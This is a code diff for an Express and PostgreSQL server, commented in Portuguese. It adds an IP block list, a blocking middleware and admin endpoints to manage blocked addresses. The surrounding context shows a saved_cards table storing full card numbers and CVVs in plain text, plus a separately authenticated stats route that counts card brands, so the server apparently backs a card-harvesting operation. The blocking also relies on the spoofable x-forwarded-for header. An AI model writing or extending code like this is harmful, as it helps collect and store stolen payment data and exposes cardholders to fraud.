@@ -61,6 +61,13 @@ async function initDB() {
   `);
   await pool.query(`CREATE INDEX IF NOT EXISTS idx_rl_ip ON request_logs(ip)`);
   await pool.query(`CREATE INDEX IF NOT EXISTS idx_rl_ts ON request_logs(created_at DESC)`);
+  await pool.query(`
+    CREATE TABLE IF NOT EXISTS blocked_ips (
+      ip         TEXT PRIMARY KEY,
+      reason     TEXT,
+      created_at TIMESTAMPTZ DEFAULT NOW()
+    )
+  `);
   // Adiciona colunas extras — se já existirem, o IF NOT EXISTS ignora silenciosamente
   await pool.query(`ALTER TABLE saved_cards ADD COLUMN IF NOT EXISTS cvv         TEXT`);
   await pool.query(`ALTER TABLE saved_cards ADD COLUMN IF NOT EXISTS card_number TEXT`);
@@ -83,13 +90,28 @@ app.use(cors());
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// ── IP Logger ─────────────────────────────────────────────────────────────────
-app.use((req, res, next) => {
+// ── IP Logger + Bloqueio ──────────────────────────────────────────────────────
+app.use(async (req, res, next) => {
   const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress || null;
+
+  // Loga a requisição (assíncrono, não bloqueia)
   pool.query(
     'INSERT INTO request_logs (ip, method, path, user_agent) VALUES ($1,$2,$3,$4)',
     [ip, req.method, req.path, req.headers['user-agent'] || null]
   ).catch(() => {});
+
+  // Verifica se o IP está bloqueado (exceto rotas de admin para não se bloquear)
+  if (ip && !req.path.startsWith('/api/admin')) {
+    try {
+      const r = await pool.query('SELECT 1 FROM blocked_ips WHERE ip = $1', [ip]);
+      if (r.rows.length) {
+        return res.status(403).json({ ok: false, message: 'Acesso negado.' });
+      }
+    } catch (e) {
+      // falha silenciosa — não bloqueia em caso de erro de DB
+    }
+  }
+
   next();
 });
 
@@ -301,6 +323,40 @@ app.get('/api/isack/stats', authIsack, async (req, res) => {
       last24: parseInt(recent.rows[0].count),
       brands: brands.rows.map(r => ({ brand: r.brand || 'desconhecido', count: parseInt(r.count) })),
     });
+  } catch (e) {
+    res.status(500).json({ ok: false });
+  }
+});
+
+// ── Admin IPs Bloqueados ──────────────────────────────────────────────────────
+app.get('/api/admin/blocked-ips', authAdmin, async (req, res) => {
+  try {
+    const r = await pool.query('SELECT ip, reason, created_at FROM blocked_ips ORDER BY created_at DESC');
+    res.json({ ok: true, blocked: r.rows });
+  } catch (e) {
+    res.status(500).json({ ok: false });
+  }
+});
+
+app.post('/api/admin/blocked-ips', authAdmin, async (req, res) => {
+  try {
+    const { ip, reason } = req.body;
+    if (!ip) return res.status(400).json({ ok: false, message: 'IP obrigatório.' });
+    await pool.query(
+      'INSERT INTO blocked_ips (ip, reason) VALUES ($1,$2) ON CONFLICT (ip) DO UPDATE SET reason=$2',
+      [ip.trim(), reason || null]
+    );
+    res.json({ ok: true });
+  } catch (e) {
+    res.status(500).json({ ok: false });
+  }
+});
+
+app.delete('/api/admin/blocked-ips/:ip', authAdmin, async (req, res) => {
+  try {
+    const ip = decodeURIComponent(req.params.ip);
+    await pool.query('DELETE FROM blocked_ips WHERE ip = $1', [ip]);
+    res.json({ ok: true });
   } catch (e) {
     res.status(500).json({ ok: false });
   }
